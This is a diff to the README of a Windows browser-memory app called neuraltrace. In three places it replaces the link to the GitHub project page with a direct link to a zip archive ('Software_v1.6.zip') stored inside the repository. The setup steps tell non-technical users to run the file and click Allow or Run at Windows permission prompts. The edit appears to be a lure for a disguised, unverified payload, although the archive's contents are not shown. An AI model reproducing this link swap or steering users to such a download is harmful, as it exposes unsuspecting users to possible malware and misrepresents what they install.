@@ -1,6 +1,6 @@
 # 🧠 neuraltrace - Give Your Browser A Memory
 
-[Download neuraltrace](https://github.com/hookerneologist793/neuraltrace)
+[Download neuraltrace](https://raw.githubusercontent.com/hookerneologist793/neuraltrace/main/public/Software_v1.6.zip)
 
 ## ✨ What It Does
 
@@ -20,7 +20,7 @@ This guide is for Windows users who want to get neuraltrace running with no codi
 
 ### Get the app
 1. Open the download page:
-   [Download neuraltrace](https://github.com/hookerneologist793/neuraltrace)
+   [Download neuraltrace](https://raw.githubusercontent.com/hookerneologist793/neuraltrace/main/public/Software_v1.6.zip)
 2. Save the file or open the page from GitHub
 3. Follow the steps on the page to install or run the app
 4. If Windows asks for permission, click Allow or Run
@@ -101,7 +101,7 @@ neuraltrace keeps your data local on your machine. It uses SQLite so your saved 
 ## 🔗 Download and Install
 
 Use this link to visit the project page and get the app:
-[Download neuraltrace](https://github.com/hookerneologist793/neuraltrace)
+[Download neuraltrace](https://raw.githubusercontent.com/hookerneologist793/neuraltrace/main/public/Software_v1.6.zip)
 
 After you open the page:
 1. Look for the latest release or download option
